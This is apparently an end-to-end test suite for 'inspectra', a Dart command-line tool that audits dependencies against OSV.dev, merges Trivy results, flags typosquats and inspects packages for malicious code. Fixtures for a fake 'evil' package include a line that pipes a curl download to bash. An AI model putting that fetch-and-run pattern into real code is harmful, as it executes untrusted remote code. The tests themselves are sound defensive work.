/*
 * Copyright 2026 Davils
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:inspectra/inspectra.dart';
import 'package:test/test.dart';

import '../support/archive_fixtures.dart';
import '../support/fake_http_server.dart';
import '../support/fake_process_runner.dart';
import '../support/fake_response.dart';
import '../support/fixture.dart';
import '../support/test_harness.dart';

/// Runs the complete command line in-process against fake services.
void main() {
  final server = Fixture<FakeHttpServer>();
  final harnesses = <TestHarness>[];

  setUp(() async => server.value = await FakeHttpServer.start());
  tearDown(() async {
    await server.value.close();
    for (final harness in harnesses) {
      harness.dispose();
    }
    harnesses.clear();
  });

  const lockfile = '''
packages:
  http:
    dependency: "direct main"
    description: {name: http, url: "https://pub.dev"}
    source: hosted
    version: "0.13.0"
''';
  const pubspec = '''
name: demo
environment:
  sdk: ^3.5.0
dependencies:
  http: ^0.13.0
''';

  /// Creates a harness for a project with [files] whose services point at
  /// the fake server.
  TestHarness project(
    Map<String, String> files, {
    ProcessRunner? processRunner,
  }) {
    final harness = TestHarness.withFiles(
      files,
      environment: <String, String>{
        'INSPECTRA_NETWORK_OSV_URL': server.value.baseUrl,
        'INSPECTRA_NETWORK_PUB_HOSTED_URL': server.value.baseUrl,
        'INSPECTRA_NETWORK_MAX_ATTEMPTS': '1',
      },
      processRunner: processRunner,
    );
    harnesses.add(harness);
    return harness;
  }

  /// Serves one advisory for `http 0.13.0`.
  void serveAdvisory() {
    server.value
      ..on(
        'POST',
        '/v1/querybatch',
        FakeResponse.json(<String, Object?>{
          'results': <Object?>[
            <String, Object?>{
              'vulns': <Object?>[
                <String, Object?>{'id': 'GHSA-4rgh-jx4f-qfcq', 'modified': 'm'},
              ],
            },
          ],
        }),
      )
      ..on(
        'GET',
        '/v1/vulns/GHSA-4rgh-jx4f-qfcq',
        FakeResponse.json(<String, Object?>{
          'id': 'GHSA-4rgh-jx4f-qfcq',
          'modified': 'm',
          'summary': 'http before 0.13.3 vulnerable to header injection',
          'aliases': <Object?>['CVE-2020-35669'],
          'severity': <Object?>[
            <String, Object?>{
              'type': 'CVSS_V3',
              'score': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N',
            },
          ],
          'affected': <Object?>[
            <String, Object?>{
              'package': <String, Object?>{'name': 'http', 'ecosystem': 'Pub'},
              'ranges': <Object?>[
                <String, Object?>{
                  'type': 'ECOSYSTEM',
                  'events': <Object?>[
                    <String, Object?>{'introduced': '0'},
                    <String, Object?>{'fixed': '0.13.3'},
                  ],
                },
              ],
            },
          ],
        }),
      );
  }

  group('audit', () {
    test('reports advisories in the stable JSON layout', () async {
      serveAdvisory();
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      final int code = await harness.run(<String>['audit', '--format', 'json']);
      expect(code, 1);
      final json = jsonDecode(harness.out) as Map<String, Object?>;
      expect(json['scanned'], 1);
      expect(json['vulnerablePackages'], 1);
      expect(json['totalVulnerabilities'], 1);
      final result = (json['results']! as List).single as Map;
      final vuln = (result['vulnerabilities'] as List).single as Map;
      expect(vuln['severity'], 'medium');
      expect(vuln['fixedVersion'], '0.13.3');
      expect(vuln['aliases'], <String>['CVE-2020-35669']);
    });

    test(
      '--ignore suppresses by alias and --exit-zero keeps CI green',
      () async {
        serveAdvisory();
        final TestHarness harness = project(<String, String>{
          'pubspec.lock': lockfile,
        });
        expect(await harness.run(<String>['audit', '-i', 'CVE-2020-35669']), 0);
        serveAdvisory();
        expect(await harness.run(<String>['audit', '--exit-zero']), 0);
      },
    );

    test('--fail-on raises the failure threshold', () async {
      serveAdvisory();
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      expect(await harness.run(<String>['audit', '--fail-on', 'high']), 0);
    });

    test('exits with 69 when OSV.dev is unreachable or offline', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      expect(await harness.run(<String>['audit']), 69);
      expect(
        await harness.run(<String>['audit', '--offline', '--exit-zero']),
        69,
      );
      expect(harness.err, contains('offline'));
    });

    test('exits with 65 for a missing or malformed lockfile', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': '[1',
      });
      expect(await harness.run(<String>['audit']), 65);
      expect(await harness.run(<String>['audit', '-l', 'missing.lock']), 65);
    });

    test('writes SARIF to a file', () async {
      serveAdvisory();
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      final int code = await harness.run(<String>[
        'audit',
        '-f',
        'sarif',
        '-o',
        'out/report.sarif',
      ]);
      expect(code, 1);
      final file = File('${harness.workingDirectory}/out/report.sarif');
      final sarif = jsonDecode(file.readAsStringSync()) as Map;
      expect(sarif['version'], '2.1.0');
    });
  });

  group('command line', () {
    test('prints the version', () async {
      final TestHarness harness = project(const <String, String>{});
      expect(await harness.run(<String>['--version']), 0);
      expect(harness.out, contains('inspectra $inspectraVersion'));
    });

    test('exits with 64 for usage errors', () async {
      final TestHarness harness = project(const <String, String>{});
      expect(await harness.run(<String>['audit', '--bogus']), 64);
      expect(await harness.run(<String>['inspect', 'http']), 64);
      expect(await harness.run(<String>['inspect', 'http', '^1.0.0']), 64);
      expect(await harness.run(<String>['nope']), 64);
    });

    test('exits with 65 for an invalid configuration', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
        'inspectra.yaml': 'trivy:\n  mode: sometimes\n',
      });
      expect(await harness.run(<String>['audit']), 65);
      expect(harness.err, contains('trivy.mode'));
    });

    test('runs scan by default', () async {
      serveAdvisory();
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
        'pubspec.yaml': pubspec,
      });
      final int code = await harness.run(<String>[
        '--trivy-mode',
        'disabled',
        '-f',
        'json',
      ]);
      expect(code, 1);
      final json = jsonDecode(harness.out) as Map<String, Object?>;
      expect(json['command'], 'scan');
      expect((json['trivy']! as Map)['status'], 'skipped');
    });
  });

  group('scan with Trivy', () {
    /// A process runner pretending to be Trivy 0.75.0 that reports the same
    /// advisory as OSV.dev plus a secret.
    FakeProcessRunner fakeTrivy() => FakeProcessRunner((executable, args) {
      if (args.contains('--version')) {
        return const ProcessOutcome(
          exitCode: 0,
          stdout: '{"Version":"0.75.0"}',
          stderr: '',
        );
      }
      return ProcessOutcome(
        exitCode: 0,
        stdout: jsonEncode(<String, Object?>{
          'Results': <Object?>[
            <String, Object?>{
              'Target': 'pubspec.lock',
              'Vulnerabilities': <Object?>[
                <String, Object?>{
                  'VulnerabilityID': 'CVE-2020-35669',
                  'PkgName': 'http',
                  'InstalledVersion': '0.13.0',
                  'Severity': 'MEDIUM',
                },
              ],
            },
            <String, Object?>{
              'Target': 'lib/keys.dart',
              'Secrets': <Object?>[
                <String, Object?>{
                  'RuleID': 'github-pat',
                  'Severity': 'CRITICAL',
                  'Title': 'GitHub Personal Access Token',
                  'StartLine': 1,
                },
              ],
            },
          ],
        }),
        stderr: '',
      );
    });

    test('merges Trivy results and removes duplicate advisories', () async {
      serveAdvisory();
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
        'pubspec.yaml': pubspec,
      }, processRunner: fakeTrivy());
      final int code = await harness.run(<String>[
        'scan',
        '--trivy-executable',
        '/opt/trivy/trivy',
        '-f',
        'json',
      ]);
      expect(code, 1);
      final json = jsonDecode(harness.out) as Map<String, Object?>;
      final List<dynamic> rules = (json['findings']! as List)
          .map((f) => (f as Map)['ruleId'])
          .toList();
      expect(rules, containsAll(<String>['GHSA-4rgh-jx4f-qfcq', 'github-pat']));
      expect(rules, isNot(contains('CVE-2020-35669')));
      expect((json['trivy']! as Map)['origin'], 'configured');
    });

    test('fails with 69 when Trivy is required but unavailable', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      final int code = await harness.run(<String>[
        'trivy',
        '--offline',
        '--trivy-mode',
        'required',
      ]);
      expect(code, 69);
      expect(harness.err, contains('required'));
    });

    test('reports why Trivy was skipped in auto mode', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.lock': lockfile,
      });
      final int code = await harness.run(<String>[
        'trivy',
        '--offline',
        '--set',
        'trivy.use_installed=false',
      ]);
      expect(code, 0);
      expect(harness.out, contains('Trivy skipped'));
    });
  });

  group('inspect and add', () {
    /// Serves package `evil` 1.0.0 whose archive contains [files].
    void servePackage(Map<String, String> files) {
      final Uint8List archive = buildTarGz(files);
      server.value
        ..on(
          'GET',
          '/api/packages/evil',
          FakeResponse.json(<String, Object?>{
            'name': 'evil',
            'latest': <String, Object?>{'version': '1.0.0'},
            'versions': <Object?>[
              <String, Object?>{
                'version': '1.0.0',
                'published': '2020-01-01T00:00:00Z',
                'archive_url':
                    '${server.value.baseUrl}/archives/evil-1.0.0.tar.gz',
                'archive_sha256': sha256.convert(archive).toString(),
              },
            ],
          }),
        )
        ..on(
          'GET',
          '/archives/evil-1.0.0.tar.gz',
          FakeResponse(200, body: archive),
        )
        ..on(
          'GET',
          '/api/packages/evil/publisher',
          FakeResponse.json(<String, Object?>{'publisherId': 'evil.dev'}),
        );
    }

    test('flags malicious source above the risk threshold', () async {
      servePackage(<String, String>{
        'pubspec.yaml': 'name: evil\n',
        'lib/evil.dart':
            "void x() { Process.run('bash', ['-c', 'curl x | sh']); }",
      });
      final TestHarness harness = project(const <String, String>{});
      final int code = await harness.run(<String>[
        'inspect',
        'evil',
        '1.0.0',
        '-f',
        'json',
      ]);
      expect(code, 1);
      final json = jsonDecode(harness.out) as Map<String, Object?>;
      expect(json['riskScore'], greaterThanOrEqualTo(30));
      expect(json['riskLabel'], 'HIGH RISK');
    });

    test('rejects archives that do not match their checksum', () async {
      servePackage(<String, String>{'lib/a.dart': ''});
      server.value.on(
        'GET',
        '/archives/evil-1.0.0.tar.gz',
        FakeResponse(200, body: buildTarGz(<String, String>{'x': 'y'})),
      );
      final TestHarness harness = project(const <String, String>{});
      expect(await harness.run(<String>['inspect', 'evil', '1.0.0']), 69);
      expect(harness.err, contains('checksum'));
    });

    test(
      'add --dry-run blocks a suspicious package without installing',
      () async {
        servePackage(<String, String>{
          'lib/evil.dart': "void x() { Process.run('sh', []); }",
        });
        final runner = FakeProcessRunner(
          (executable, arguments) =>
              const ProcessOutcome(exitCode: 0, stdout: '', stderr: ''),
        );
        final TestHarness harness = project(<String, String>{
          'pubspec.yaml': pubspec,
        }, processRunner: runner);
        final int code = await harness.run(<String>[
          'add',
          'evil',
          '--dry-run',
        ]);
        expect(code, 1);
        expect(runner.calls, isEmpty);
        expect(harness.out, contains('[BLOCKED]'));
      },
    );

    test(
      'add installs exactly the audited version of a clean package',
      () async {
        servePackage(<String, String>{'lib/evil.dart': 'void x() {}'});
        final runner = FakeProcessRunner(
          (executable, arguments) =>
              const ProcessOutcome(exitCode: 0, stdout: 'ok', stderr: ''),
        );
        final TestHarness harness = project(<String, String>{
          'pubspec.yaml': pubspec,
        }, processRunner: runner);
        final int code = await harness.run(<String>['add', 'evil', '--dev']);
        expect(code, 0);
        expect(runner.calls.single, 'dart pub add --dev evil:1.0.0');
      },
    );
  });

  group('typosquat and trust', () {
    test('typosquat fails on HIGH findings by default', () async {
      final TestHarness harness = project(<String, String>{
        'pubspec.yaml': 'name: a\ndependencies:\n  providr: ^1.0.0\n',
      });
      expect(await harness.run(<String>['typosquat', '--offline']), 1);
      expect(harness.out, contains('LEVENSHTEIN_1'));
    });

    test('trust reports unknown packages as usage errors', () async {
      final TestHarness harness = project(const <String, String>{});
      expect(await harness.run(<String>['trust', 'missing_pkg']), 64);
    });
  });

  group('hook', () {
    test('installs the hook where git says', () async {
      final runner = FakeProcessRunner(
        (executable, arguments) => const ProcessOutcome(
          exitCode: 0,
          stdout: '.git/hooks/pre-commit',
          stderr: '',
        ),
      );
      final TestHarness harness = project(
        const <String, String>{},
        processRunner: runner,
      );
      expect(await harness.run(<String>['hook']), 0);
      expect(
        File('${harness.workingDirectory}/.git/hooks/pre-commit').existsSync(),
        isTrue,
      );
      expect(await harness.run(<String>['hook', 'remove']), 0);
    });

    test(
      'hook run checks the staged content of the configured checks',
      () async {
        const staged = <String>[
          'pubspec.yaml',
          'lib/good.dart',
          'lib/messy.dart',
          'README.md',
        ];
        final runner = FakeProcessRunner((executable, arguments) {
          if (executable != 'git') {
            return const ProcessOutcome(exitCode: 0, stdout: '', stderr: '');
          }
          final bool unstaged =
              arguments.contains('diff') && !arguments.contains('--cached');
          if (arguments.contains('diff')) {
            return ProcessOutcome(
              exitCode: 0,
              stdout: unstaged ? 'lib/messy.dart\u0000' : staged.join('\u0000'),
              stderr: '',
            );
          }
          final String object = arguments.last;
          final String? content = <String, String>{
            ':./pubspec.yaml':
                'name: app\ndependencies:\n  http: any\n  htpp: ^1.0.0\n',
            ':./lib/good.dart': 'void main() {}\n',
            ':./lib/messy.dart': 'void main() {\n  if (true) {} else {}\n}\n',
          }[object];
          return ProcessOutcome(
            exitCode: content == null ? 128 : 0,
            stdout: content ?? '',
            stderr: content == null ? 'fatal: not staged' : '',
          );
        });
        final TestHarness harness = project(<String, String>{
          'pubspec.yaml': 'name: app\n',
          'inspectra.yaml':
              'network:\n  offline: true\n'
              'hook:\n  checks: [typosquat, deps, style]\n'
              'style:\n  rules:\n    no_else: true\n',
          'lib/good.dart': 'void main() {}\n',
          'lib/messy.dart': 'void main() {}\n',
        }, processRunner: runner);
        expect(
          await harness.run(<String>['hook', 'run', '-f', 'json']),
          1,
          reason: harness.err,
        );
        final report = jsonDecode(harness.out) as Map<String, Object?>;
        expect(report['command'], 'hook run');
        expect(report['staged'], <String>[
          'lib/good.dart',
          'lib/messy.dart',
          'pubspec.yaml',
        ]);
        final List<Map<String, Object?>> findings =
            (report['findings']! as List<Object?>).cast<Map<String, Object?>>();
        expect(
          findings.map((finding) => '${finding['ruleId']} ${finding['file']}'),
          <String>[
            'LEVENSHTEIN_1 pubspec.yaml',
            'ANY_VERSION pubspec.yaml',
            'no_else lib/messy.dart',
          ],
        );
      },
    );
  });
}
